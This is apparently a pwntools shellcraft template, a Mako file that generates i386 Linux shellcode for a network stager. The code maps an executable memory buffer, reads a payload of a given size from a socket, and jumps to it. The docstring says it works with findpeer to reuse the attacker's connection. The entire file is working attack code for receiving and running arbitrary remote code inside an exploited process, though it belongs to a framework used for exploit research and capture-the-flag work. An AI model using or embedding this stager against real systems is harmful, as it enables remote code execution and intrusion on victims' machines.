<% from pwnlib.shellcraft import common %>
<% from pwnlib.shellcraft import i386 %>
<% from pwnlib.shellcraft.i386 import linux %>
<%docstring>
Recives a fixed sized payload into a mmaped buffer
Useful in conjuncion with findpeer.
Args:
    sock, the socket to read the payload from.
    size, the size of the payload
</%docstring>
<%page args="sock, size"/>

<%
    stager = common.label("stager")
    mmap = common.label("mmap")
    looplabel = common.label("loop")
    errlabel = common.label("error")
%>

${stager}:
/* old_mmap(NULL, size, PROT_EXEC|PROT_WRITE|PROT_READ, MAP_ANON|MAP_PRIVATE, -1) */
    push ${sock}
    xor eax, eax
    mov al, SYS_mmap
    xor ebx, ebx
    ${i386.mov("ecx", size)}
    push ecx
    xor edx, edx
    mov dl, PROT_EXEC|PROT_WRITE|PROT_READ
    push MAP_ANON|MAP_PRIVATE
    pop esi
    xor edi, edi
    dec edi
    int 0x80
    push eax

    pop ecx /* addr of mmaped buffer */
    pop edx /* size */
    pop ebx /* sock */
    push ecx /* save for: pop eax; call eax later */

/* read/recv loop */
${looplabel}:
    xor eax, eax
    mov al, SYS_read
    int 0x80
    test eax, eax
    js ${errlabel}
    sub edx, eax
    add ecx, eax
    test edx, edx
    jne ${looplabel}

    pop eax /* start of mmaped buffer */
    push ebx /* sock */
    call eax /* jump and hope for it to work */

${errlabel}:
    hlt
